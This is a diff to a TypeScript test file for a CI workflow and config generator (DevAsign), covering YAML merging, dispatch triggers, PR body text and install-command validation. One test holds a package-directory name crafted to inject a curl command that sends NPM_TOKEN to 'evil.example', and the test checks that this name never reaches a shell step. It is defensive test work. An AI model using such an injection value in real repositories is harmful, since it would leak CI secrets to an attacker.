@@ -6,6 +6,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { parse } from "yaml";
+import type { DevasignVerifyConfig } from "../contract.js";
 import { inferSetupFromTree } from "../detect.js";
 import {
   ACTION_REF,
@@ -13,15 +14,22 @@ import {
   DEVASIGN_YML_HEADER,
   expectedSecrets,
   extendWorkflow,
-  generateDevasignYml,
   generateWorkflow,
   guessVerifyConfig,
   isKnownInstallCommand,
+  mergeDevasignYml,
   patchExtendedWorkflowForDoctor,
   patchWorkflowForDoctor,
   prBody,
   stackHints,
+  type YmlMergeResult,
 } from "./generate.js";
+
+/** The merged text, failing loudly when the merge reported a parse error instead. */
+function ymlText(result: YmlMergeResult): string {
+  assert.ok("text" in result, `expected merged yml, got ${JSON.stringify(result)}`);
+  return result.text;
+}
 
 type Stack = { name: string; paths: string[]; packageJson?: object; files?: Record<string, string> };
 
@@ -62,7 +70,7 @@ function build(stack: Stack) {
   const secrets = expectedSecrets(setup, workflows);
   const workflow = generateWorkflow(setup, hints, secrets, stack.paths);
   const verify = guessVerifyConfig(setup, hints, pkg, secrets);
-  const yml = generateDevasignYml(null, verify);
+  const yml = ymlText(mergeDevasignYml(null, verify));
   return { setup, hints, secrets, workflow, verify, yml, parsed: parse(workflow) as any };
 }
 
@@ -135,7 +143,7 @@ test("Node + Jest: no services, secrets from .env.example minus PORT; FastAPI: s
   assert.deepEqual(connectionEnv(none.setup), {});
 });
 
-test("extendWorkflow appends the step to the test job, grants id-token, adds the dispatch trigger, and keeps comments", () => {
+test("extendWorkflow appends the step to the test job, grants id-token, leaves a multi-job file's triggers alone, and keeps comments", () => {
   const existing = [
     "# my CI",
     "name: CI",
@@ -169,7 +177,11 @@ test("extendWorkflow appends the step to the test job, grants id-token, adds the
     assert.equal(w.jobs.lint.steps.length, 1, "other jobs untouched");
     assert.equal(w.jobs.test.permissions["id-token"], "write");
     assert.equal(w.jobs.test.permissions.contents, "read");
-    assert.deepEqual(w.on.repository_dispatch.types, ["devasign-verify"]);
+    // A repository_dispatch runs EVERY job in the file, so this one — which also lints —
+    // never gets the trigger: a re-run request would have run whatever else lives here.
+    assert.equal(out.dispatch, false);
+    assert.equal(w.on.repository_dispatch, undefined);
+    assert.deepEqual(w.jobs.test.steps[0], { uses: "actions/checkout@v4" }, "and their checkout is left exactly as it was");
     assert.equal(w.jobs.test.services.postgres.image, "postgres:16", "their services are reused");
     const again = extendWorkflow(out.text);
     assert.ok("error" in again && /already/.test(again.error));
@@ -177,41 +189,200 @@ test("extendWorkflow appends the step to the test job, grants id-token, adds the
   assert.ok("error" in extendWorkflow("name: x\n"));
   const picked = extendWorkflow("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: []\n  deploy:\n    runs-on: ubuntu-latest\n    steps: []\n", { job: "deploy" });
   assert.ok("text" in picked && picked.job === "deploy");
+  assert.ok("text" in picked && picked.dispatch === false, "a file with a deploy job beside the tested one is not ours to re-trigger");
 });
 
-test("generateDevasignYml merges into an existing file without touching other blocks and never overwrites a customer's verify block", () => {
+test("a single-job workflow does take the dispatch trigger, and its checkout learns the dispatched sha", () => {
+  const only = ["name: CI", "on:", "  pull_request:", "jobs:", "  test:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: actions/checkout@v4", "      - run: npm test", ""].join("\n");
+  const out = extendWorkflow(only);
+  assert.ok("text" in out, JSON.stringify(out));
+  if (!("text" in out)) return;
+  assert.equal(out.dispatch, true);
+  const w = parse(out.text);
+  assert.deepEqual(w.on.repository_dispatch.types, ["devasign-verify"]);
+  // Without a ref the dispatched run checks out the default branch and verifies the
+  // wrong commit; github.sha keeps every other event checking out exactly what it did.
+  assert.equal(w.jobs.test.steps[0].with.ref, "${{ github.event.client_payload.sha || github.sha }}");
+  assert.equal(w.on.pull_request, null, "their own triggers are untouched");
+
+  const theirRef = extendWorkflow(only.replace("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v4\n        with:\n          ref: main\n          fetch-depth: 0"));
+  assert.ok("text" in theirRef);
+  if ("text" in theirRef) {
+    const w2 = parse(theirRef.text);
+    assert.equal(w2.jobs.test.steps[0].with.ref, "main", "a ref they chose is theirs");
+    assert.equal(w2.jobs.test.steps[0].with["fetch-depth"], 0);
+  }
+});
+
+// The nested-app boot config Phase 3 infers, plus the two keys inference must never write.
+const INFERRED: DevasignVerifyConfig = {
+  e2e: "auto",
+  start: "npm --prefix frontend run dev -- --port 3001 --strictPort",
+  url: "http://localhost:3001",
+  ready: "/",
+  servers: [{ name: "backend", start: "npm --prefix backend run dev:ephemeral", url: "http://localhost:8787", ready: "/" }],
+  login: { script: "node ./scripts/devasign-login.mjs" },
+  env: ["SESSION_SECRET"],
+  services: [{ name: "postgres" }],
+};
+
+test("mergeDevasignYml adds the verify block to a file that lacks one, keeping comments and other top-level keys", () => {
   const existing = "# repo config\nversion: 2\nfamily:\n  name: acme # keep\n  sisters:\n    - acme/other\n";
-  const merged = generateDevasignYml(existing, { e2e: "auto", start: "npm run dev", url: "http://localhost:3000" });
+  const merged = ymlText(mergeDevasignYml(existing, { e2e: "auto", start: "npm run dev", url: "http://localhost:3000" }));
   assert.match(merged, /# repo config/);
   assert.match(merged, /name: acme # keep/);
   const doc = parse(merged);
   assert.equal(doc.version, 2);
   assert.deepEqual(doc.family.sisters, ["acme/other"]);
   assert.equal(doc.verify.start, "npm run dev");
-  const theirs = "verify:\n  e2e: never\n";
-  assert.equal(generateDevasignYml(theirs, { e2e: "auto" }), theirs);
-  const fresh = generateDevasignYml(null, { e2e: "auto" });
+  const fresh = ymlText(mergeDevasignYml(null, { e2e: "auto" }));
   assert.match(fresh, /^# \.devasign\.yml/);
 });
 
-test("the yml header and setup PR body describe what happens without boot config: a PR note, unverifiable only under e2e: always", () => {
+test("mergeDevasignYml adds the boot keys an existing verify block lacks and never overwrites one the maintainer set", () => {
+  const existing = [
+    "# ours",
+    "verify:",
+    "  e2e: always",
+    "  url: http://localhost:4000 # theirs",
+    "  login:",
+    "    strategy: none",
+    "family:",
+    "  name: acme",
+    "",
+  ].join("\n");
+  const merged = ymlText(mergeDevasignYml(existing, INFERRED));
+  const v = parse(merged).verify;
+  assert.equal(v.e2e, "always", "their policy stands");
+  assert.equal(v.url, "http://localhost:4000", "their url stands");
+  // start/url/servers/login describe ONE boot. Our vite start beside their :4000 points
+  // the browser at a port nothing serves — under e2e: always, at every UI criterion.
+  assert.equal(v.start, undefined, "half their boot and half ours is not a boot");
+  assert.equal(v.ready, undefined);
+  assert.equal(v.servers, undefined);
+  assert.equal(v.login.strategy, "none", "and their login block is not rewritten either");
+  assert.equal(v.env, undefined, "inference never writes env");
+  assert.equal(v.services, undefined, "inference never writes services");
+  assert.match(merged, /# ours/);
+  assert.match(merged, /# theirs/);
+  assert.equal(parse(merged).family.name, "acme");
+
+  // A repo already booting fine on the single-process path: adding servers/login would
+  // switch it onto managed boot and start a service it never asked for.
+  const theirs = "verify:\n  e2e: auto\n  start: docker compose up -d && npm run dev\n  url: http://localhost:8080\n  ready: /\n";
+  const untouched = parse(ymlText(mergeDevasignYml(theirs, INFERRED))).verify;
+  assert.equal(untouched.start, "docker compose up -d && npm run dev");
+  assert.equal(untouched.servers, undefined);
+  assert.equal(untouched.login, undefined);
+
+  const theirLogin = "verify:\n  e2e: auto\n  login:\n    script: node ./scripts/mine.mjs\n    check: /api/me\n";
+  const keptYml = ymlText(mergeDevasignYml(theirLogin, INFERRED));
+  const kept = parse(keptYml).verify.login;
+  assert.deepEqual(kept, { script: "node ./scripts/mine.mjs", check: "/api/me" }, "a login script of their own is left alone");
+  assert.equal(parse(keptYml).verify.start, undefined, "and a login script of their own says the boot is theirs");
+
+  // devasignhq/agent: e2e and login stay where they are, the boot keys are appended.
+  const dogfood = ymlText(mergeDevasignYml("verify:\n  e2e: auto\n  login:\n    strategy: none\n", INFERRED));
+  assert.equal(
+    dogfood,
+    [
+      "verify:",
+      "  e2e: auto",
+      "  login:",
+      "    script: node ./scripts/devasign-login.mjs",
+      "  start: npm --prefix frontend run dev -- --port 3001 --strictPort",
+      "  url: http://localhost:3001",
+      "  ready: /",
+      "  servers:",
+      "    - name: backend",
+      "      start: npm --prefix backend run dev:ephemeral",
+      "      url: http://localhost:8787",
+      "      ready: /",
+      "",
+    ].join("\n")
+  );
+});
+
+test("mergeDevasignYml is a no-op when nothing is missing, adds nothing under e2e: never, and refuses to rewrite a file it could not parse", () => {
+  const already = "verify:\n  e2e: auto\n  start: npm run dev\n  url: http://localhost:3000\n  ready: /\n  login:\n    script: node ./scripts/devasign-login.mjs\n";
+  assert.deepEqual(mergeDevasignYml(already, { e2e: "auto", start: "other", url: "http://localhost:9999", ready: "/x" }), { text: already }, "the original string comes back byte for byte");
+
+  const never = "verify:\n  e2e: never\n";
+  assert.deepEqual(mergeDevasignYml(never, INFERRED), { text: never });
+  assert.equal(parse(ymlText(mergeDevasignYml(null, { ...INFERRED, e2e: "never" }))).verify.start, undefined, "a fresh file under never gets no boot keys");
+
+  for (const broken of ["verify:\n  e2e: auto\n  - nope\n", "verify:\n  e2e: auto\nfamily: [1,\n"]) {
+    const out = mergeDevasignYml(broken, INFERRED);
+    assert.ok("error" in out && !("text" in out), broken);
+    assert.match((out as { error: string }).error, /did not parse/);
+  }
+  assert.ok("error" in mergeDevasignYml("verify: 3\n", INFERRED), "a verify key that is not a map is the maintainer's to fix");
+  assert.ok("error" in mergeDevasignYml("- one\n- two\n", INFERRED), "a document that is not a map is never replaced");
+});
+
+test("mergeDevasignYml answers overwrite their own keys only, in an existing block and in a new file", () => {
+  const existing = "verify:\n  e2e: auto\n  start: npm run dev\n  url: http://localhost:3000\n";
+  const merged = ymlText(mergeDevasignYml(existing, INFERRED, { url: "http://localhost:5173", login: { script: "node ./scripts/answer.mjs", check: "/api/me" } }));
+  const v = parse(merged).verify;
+  assert.equal(v.url, "http://localhost:5173", "the answer wins over the maintainer's url");
+  assert.equal(v.start, "npm run dev", "an unanswered key they set is still untouched");
+  assert.deepEqual(v.login, { script: "node ./scripts/answer.mjs", check: "/api/me" });
+  assert.equal(v.servers, undefined, "their start owns the boot: inference adds no server beside it");
+
+  const fresh = parse(ymlText(mergeDevasignYml(null, INFERRED, { e2e: "always" }))).verify;
+  assert.equal(fresh.e2e, "always");
+  assert.equal(fresh.start, INFERRED.start);
+});
+
+test("the yml header and the PR body's Browser tests section describe what happens with and without boot config, and promise no boot until Phase 4 proves one", () => {
   assert.match(DEVASIGN_YML_HEADER, /checked below browser level with a note on each PR/);
   assert.match(DEVASIGN_YML_HEADER, /always \(no browser = unverifiable\)/);
   assert.doesNotMatch(DEVASIGN_YML_HEADER, /reported as unverifiable \(never as failed\)/);
   assert.ok(DEVASIGN_YML_HEADER.split("\n").every((l) => !l || l.startsWith("# ")), "every header line stays a YAML comment");
-  assert.deepEqual(parse(generateDevasignYml(null, { e2e: "auto" })), { verify: { e2e: "auto" } });
+  assert.deepEqual(parse(ymlText(mergeDevasignYml(null, { e2e: "auto" }))), { verify: { e2e: "auto" } });
 
   const none = build(STACKS[4]);
-  const e2e = (body: string) => body.split("### End-to-end tests\n")[1].split("\n\n")[0];
-  const unconfigured = e2e(prBody({ mode: "separate", workflowPath: "x", hints: none.hints, setup: none.setup, verify: none.verify, expected: [], missing: [] }));
+  const browser = (body: string) => body.split("### Browser tests\n")[1].split("\n\n")[0];
+  const unconfigured = browser(prBody({ mode: "separate", workflowPath: "x", hints: none.hints, setup: none.setup, verify: none.verify, expected: [], missing: [] }));
+  assert.match(unconfigured, /Set `verify\.start`.*and `verify\.url`/);
   assert.match(unconfigured, /checked below browser level and each PR carries a note saying so/);
   assert.match(unconfigured, /With `e2e: always` they are reported as \*\*unverifiable\*\* instead/);
-  assert.doesNotMatch(unconfigured, /UI criteria will be reported as \*\*unverifiable\*\* \(never failed\)/);
+  assert.match(unconfigured, /UI criteria on PRs show a note until browser tests run\./);
 
   const next = build(STACKS[0]);
-  const configured = e2e(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: next.verify, expected: [], missing: [] }));
+  const configured = browser(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: next.verify, expected: [], missing: [] }));
   assert.match(configured, /start the app with `npm run dev` and wait for `http:\/\/localhost:3000\/`/);
+  assert.match(configured, /No login script, so browser tests run signed out/);
+  assert.match(configured, /UI criteria on PRs show a note until browser tests run\./);
   assert.doesNotMatch(configured, /below browser level/, "a repo with boot config gets no fallback caveat");
+  assert.doesNotMatch(configured, /came up|booted|verified/i, "nothing claims the app actually starts until the probe says so");
+
+  const nested = browser(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: INFERRED, expected: [], missing: [] }));
+  assert.match(nested, /start the app with `npm --prefix frontend run dev -- --port 3001 --strictPort` and wait for `http:\/\/localhost:3001\/`/);
+  assert.match(nested, /- `backend` starts first: `npm --prefix backend run dev:ephemeral`, ready at `http:\/\/localhost:8787\/`/);
+  assert.match(nested, /- Signed in by `node \.\/scripts\/devasign-login\.mjs`/);
+
+  const off = browser(prBody({ mode: "separate", workflowPath: "x", hints: next.hints, setup: next.setup, verify: { e2e: "never" }, expected: [], missing: [] }));
+  assert.match(off, /`e2e: never` is set, so DevAsign plans no browser tests/);
+  assert.doesNotMatch(off, /show a note/, "never means no note to explain");
+});
+
+test("guessVerifyConfig prefers the inferred nested boot config over its root-only guess", () => {
+  const b = build(STACKS[0]);
+  const pkg = STACKS[0].packageJson as any;
+  const root = guessVerifyConfig(b.setup, b.hints, pkg, b.secrets);
+  assert.equal(root.start, "npm run dev", "without inference the root guess stands");
+  assert.equal(root.build, "npm run build");
+
+  const boot = guessVerifyConfig(b.setup, b.hints, pkg, b.secrets, { start: INFERRED.start, url: INFERRED.url, ready: "/", servers: INFERRED.servers, login: INFERRED.login });
+  assert.equal(boot.start, INFERRED.start);
+  assert.equal(boot.url, "http://localhost:3001");
+  assert.equal(boot.build, undefined, "the root-only next build does not survive a nested start");
+  assert.deepEqual(boot.login, { script: "node ./scripts/devasign-login.mjs" }, "the login script replaces strategy: none");
+  assert.deepEqual(boot.servers, INFERRED.servers);
+  assert.deepEqual(boot.services, [{ name: "postgres" }], "services and secrets still come from the detected setup");
+  assert.deepEqual(boot.env, ["NEXTAUTH_SECRET", "STRIPE_KEY"]);
+  assert.match(boot.seed!, /prisma db seed/);
 });
 
 test("prBody lists expected secrets and flags the missing ones; patchWorkflowForDoctor fixes runtime + browsers only", () => {
@@ -248,6 +419,24 @@ test("no root manifest: one install step per top-level package, cache keyed on t
   assert.equal(node.with!["cache-dependency-path"], "backend/package-lock.json\nfrontend/package-lock.json");
 });
 
+test("a package directory a shell would read as a command never reaches a run: step", () => {
+  // Git allows any byte but "/" in a path component, and `run:` is executed with bash -e.
+  // The default branch is where this tree comes from, so an ordinary PR can rename into it.
+  const evil = "web;curl$IFS-d@-$IFS'evil.example'<<<$NPM_TOKEN;#";
+  const paths = [`${evil}/package.json`, `${evil}/package-lock.json`, "frontend/package.json", "frontend/package-lock.json"];
+  const setup = inferSetupFromTree(paths, { envExample: "NPM_TOKEN=\n" });
+  const text = generateWorkflow(setup, stackHints(setup, paths, null, {}), ["NPM_TOKEN"], paths);
+  assert.ok(!text.includes("evil.example"), text);
+  const w = parse(text) as any;
+  assert.deepEqual(
+    (w.jobs.verify.steps as any[]).map((s) => s.uses || s.run),
+    ["actions/checkout@v4", "actions/setup-node@v4", "npm ci --prefix frontend", ACTION_REF],
+    "the package that cannot be named safely is left uninstalled, not interpolated"
+  );
+  assert.equal(w.jobs.verify.steps[1].with["cache-dependency-path"], "frontend/package-lock.json", "and its lockfile is not a cache key either");
+  assert.equal(w.jobs.verify.env.NPM_TOKEN, "${{ secrets.NPM_TOKEN }}", "the secrets that payload was reaching for are still wired in");
+});
+
 test("patchWorkflowForDoctor: missing_dependencies inserts the named install steps once, before the verify step", () => {
   const base = build(STACKS[4]).workflow;
   const doctor = { stage: "install" as const, code: "missing_dependencies" as const, message: "m", packages: [{ dir: "backend", install: "npm ci --prefix backend" }, { dir: "frontend", install: "npm ci --prefix frontend" }] };
@@ -264,6 +453,19 @@ test("patchWorkflowForDoctor: missing_dependencies inserts the named install ste
   assert.ok(isKnownInstallCommand("pnpm install --frozen-lockfile --dir web", "web"));
   assert.ok(isKnownInstallCommand("npm install --prefix api.v2", "api.v2"));
   assert.ok(!isKnownInstallCommand("npm install --prefix apiXv2", "api.v2"), "the dot is a dot");
+  // The same gate startCommandFor applies: these are arguments, not directories, and the
+  // guarantee belongs in the validator rather than in whichever caller remembers it.
+  assert.ok(!isKnownInstallCommand("npm install --prefix ..", ".."));
+  assert.ok(!isKnownInstallCommand("npm install --prefix .", "."));
+  assert.ok(!isKnownInstallCommand("npm install --prefix -rf", "-rf"));
+  assert.equal(patchWorkflowForDoctor(base, { ...doctor, packages: [{ dir: "..", install: "npm install --prefix .." }] }), null);
+
+  // A dir ending in a non-word character used to defeat the "already installed" guard,
+  // so every doctor follow-up appended the same step again.
+  const dotted = { ...doctor, packages: [{ dir: "api.", install: "npm install --prefix api." }] };
+  const once = patchWorkflowForDoctor(base, dotted)!;
+  assert.ok(once.includes("npm install --prefix api."));
+  assert.equal(patchWorkflowForDoctor(once, dotted), null, "the step is already there");
 });
 
 test("patchExtendedWorkflowForDoctor edits only the job that runs DevAsign verify in a customer's own workflow", () => {
